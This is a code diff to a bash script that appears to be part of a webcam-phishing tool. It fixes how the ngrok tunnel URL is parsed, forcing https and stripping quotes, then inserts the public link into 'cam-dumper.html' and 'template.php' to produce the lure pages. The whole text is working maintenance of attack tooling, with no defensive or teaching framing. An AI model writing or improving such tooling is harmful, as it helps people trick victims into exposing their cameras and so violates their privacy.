@@ -109,11 +109,21 @@ send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
-
+c="https"
+q='"'
 
 payload_ngrok() {
 
-link=$(curl -s http://127.0.0.1:4045/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s http://127.0.0.1:4045/api/tunnels | jq '.tunnels[0].public_url')
+
+if [[ $link != *"https:"* ]];
+ then
+ link=${link//http/$c}
+fi
+
+link=${link#$q}
+link=${link%$q}
+
 sed 's+forwarding_link+'$link'+g' cam-dumper.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
@@ -163,7 +173,16 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s http://127.0.0.1:4045/api/tunnels | jq '.tunnels[].public_url')
+link=$(curl -s http://127.0.0.1:4045/api/tunnels | jq '.tunnels[0].public_url')
+
+if [[ $link != *"https:"* ]];
+ then
+ link=${link//http/$c}
+fi
+
+link=${link#$q}
+link=${link%$q}
+
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
